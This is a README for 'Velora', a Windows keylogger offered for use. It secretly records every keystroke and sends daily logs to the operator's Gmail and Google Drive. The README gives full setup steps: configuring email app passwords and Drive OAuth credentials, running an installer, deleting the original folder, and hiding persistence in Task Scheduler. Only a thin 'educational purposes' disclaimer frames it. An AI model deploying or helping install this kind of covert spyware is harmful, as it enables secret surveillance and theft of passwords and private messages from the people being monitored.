## Velora
   It's An oldschool Keylooger If You dont know what's keylogger ? <br>
   A keylogger (or keystroke logger) is a surveillance tool that secretly records every key pressed on a keyboard. <br>
   Mine just records the keys and save it in log file and sent it to you drive or mail or both.

<br/>

  
 ## Disclaimer
The content, tools, and information provided here are strictly for educational and informational purposes only.

The creator accepts no responsibility or liability for any misuse, damage, or illegal activity conducted by individuals using this information. Any action you take based on this content is strictly at your own risk, and you will be held solely responsible for any consequences that arise from its misuse.

<br/>


## Dependencies
* Only Work in Windows 10, 11

<br/>


 ## Features
1. Completly Hidden
2. Sends daily log file to mail & google drive
3. Specify the time to caprute keys and spacify the of getting log file in mail and drive to 
4. Captures keys no matter what app softwere tool or anything is user useing

<br/>

## About Tools
script1.pyw = Make Logs File <br/>

script2.pyw = Sends log files to google drive <br/>

script3.pyw = Clean up the old log files after sending <br/>

script4.pyw = Sends log file to Mail <br/>

velora.pyw = Auto tun the all scripts <br/><br/><br/>


## Note
The time format does not reset after 12 like a standard 12-hour clock. Instead, it keeps counting upward continuously — after 12 comes 13, then 14, and so on up to 23, before starting over from 1. So a full cycle runs: 1 through 12, then 13 through 23, and back to 1.

<br/>
<br/>



## Installation & Mail Setup


### Step 1: Install Python
```bash
winget install Python.Python.3.12
```

<br/>


### Step 2
Open the Velora folder in any text editor (e.g., Notepad) and open `script4.py`.
Inside the file, enter your **Email**, your **Email App Password**, and the **Email** address on which you receive the mail.
Save the file and close the editor.

> **Note:** Your Email's **2-Step Verification** must be turned **ON**. Only then will Google give you the option to generate an **App Password**.

<br/>


### Step 3
Double-click on `Velora_Installer.bat` to run the installer.

<br/>


### Step 4
Delete the empty Velora folder from the location where it was originally placed.

<br/>

### Step 5
Restart your computer and sign in again.

<hr/>

<br/>


## In Task Sheduler (Hidden)

### Step 1
Press `Win + R` to open the **Run** dialog box. Type the following command and press **Enter**:
```text
shell:startup
```
This will open the **Startup** folder. Find the **Velora** shortcut inside this folder and delete it.

<br/>


### Step 2
Press `Win + R` again to open the **Run** dialog box. Type the following command and press **Enter**:
```text
%appdata%
```
This will open the **Roaming (AppData)** folder. Inside it, open the **Velora** folder and locate the file:
```text
Velora_Task_Scheduler.bat
```
Right-click on this file and select **Run as administrator**.

<br/>


### Step 3
Restart your computer and sign in again.

<hr/>

<br/>
<br/>

## ☁️ Google Drive Setup

Velora uses the Google Drive API to upload `uploaded_log.txt` to your Google Drive.

### 1. Install Dependencies
Install all required Python packages:
```bash
pip install -r requirements.txt
```
If Google Drive libraries are missing, install them manually:
```bash
pip install google-api-python-client google-auth google-auth-oauthlib google-auth-httplib2
```

### 2. Create a Google Cloud Project
1. Open **Google Cloud Console**.
2. Create a new project.
3. Go to **APIs & Services → Library**.
4. Enable **Google Drive API**.

### 3. Create OAuth Credentials
1. Go to **APIs & Services → Credentials**.
2. Click **Create Credentials**.
3. Select **OAuth Client ID**.
4. Configure the OAuth consent screen if prompted.
5. Choose **Desktop Application**.
6. Download the generated JSON file.

### 4. Configure `script2.pyw`
Edit the following configuration:
```python
CREDS_FILE = LOG_DIR / "credentials.json"
TOKEN_FILE = LOG_DIR / "token.json"
ACTIVITY_LOG = LOG_DIR / "uploaded_log.txt"
DRIVE_FOLDER_ID = "YOUR_DRIVE_FOLDER_ID"
SCOPES = [
    "https://www.googleapis.com/auth/drive.file"
]
```

#### Configuration
| Variable          | Description                                          |
| ----------------- | ---------------------------------------------------- |
| `CREDS_FILE`      | Path to your downloaded OAuth credentials.           |
| `TOKEN_FILE`      | Stores the generated access token after first login. |
| `ACTIVITY_LOG`    | Log file that will be uploaded.                      |
| `DRIVE_FOLDER_ID` | Destination Google Drive folder ID.                  |
| `SCOPES`          | Required Drive API permission.                       |

Replace:
```python
YOUR_DRIVE_FOLDER_ID
```
with your own folder ID.

Example:
```
https://drive.google.com/drive/folders/XXXXXXXXXXXXXXXXXXXXXXXX
                                         ↑ Folder ID
```

### 5. Add Credentials
Rename the downloaded OAuth file to:
```text
credentials.json
```
Place it inside the application's log directory.

### 6. First Authentication
Run Velora.

During the first launch:
* A browser window will open.
* Sign in with your Google account.
* Grant Drive access.
* `token.json` will be created automatically.

Future uploads will use the saved token without requiring another login.

### 7. Restart Your Computer
Restart your computer and sign in again.

### Folder Structure
```text
LOG_DIR/
├── credentials.json
├── token.json
└── uploaded_log.txt
```
